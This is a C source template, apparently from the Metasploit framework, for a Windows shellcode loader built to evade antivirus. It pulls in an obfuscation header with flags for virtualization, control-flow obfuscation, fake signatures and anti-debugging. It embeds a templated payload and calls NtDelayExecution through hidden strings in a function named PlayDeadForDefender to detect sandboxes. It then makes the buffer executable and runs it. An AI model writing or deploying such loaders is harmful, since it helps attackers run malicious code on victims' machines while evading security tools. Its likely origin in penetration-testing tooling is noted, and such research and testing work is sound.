#include <stdio.h>
#include <windows.h>

#define VIRT         1 

#define CFLOW_V2     1 
#define FAKE_SIGNS   1  
#define ANTIDEBUG_V2 1 

#define NO_OBF       0 
#define NO_CFLOW     0 
#define NO_ANTIDEBUG 0 


#include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'obfusheader.h') %>"

typedef NTSTATUS (__stdcall *fnNtDelayExecution)(
       BOOLEAN              Alertable,
       PLARGE_INTEGER       DelayInterval
);

#define SCSIZE <%= payload_length %>

char bPayload[SCSIZE] = "<%= payload %>";

int PlayDeadForDefender()
{

    DWORD               dwMilliSeconds        = <%=  random_sleep %>;
	  LARGE_INTEGER       DelayInterval         = { 0 }; 
	  LONGLONG            Delay                 = 0; 
    NTSTATUS            STATUS                = 0;
        DWORD               _T0                   = 0, 
        _T1                   = 0;
        
    Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = - Delay;

    _T0 = GetTickCount();

    CALL_EXPORT(HIDE_STRING("ntdll.dll"), HIDE_STRING("NtDelayExecution"), NTSTATUS(*)(BOOLEAN, PLARGE_INTEGER), FALSE, &DelayInterval);

    _T1 = GetTickCount();

    if (_T1 - _T0 < dwMilliSeconds) {
        return 0;
    }

    return 1;
}

void main() {
    DWORD dwOldProtect;
    char* payload_fnc = NULL;

    payload_fnc = bPayload;
    VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    if(!PlayDeadForDefender())
    {
      return ;
    }
	
    (*(void (*)()) payload_fnc)();

	  return ;
}

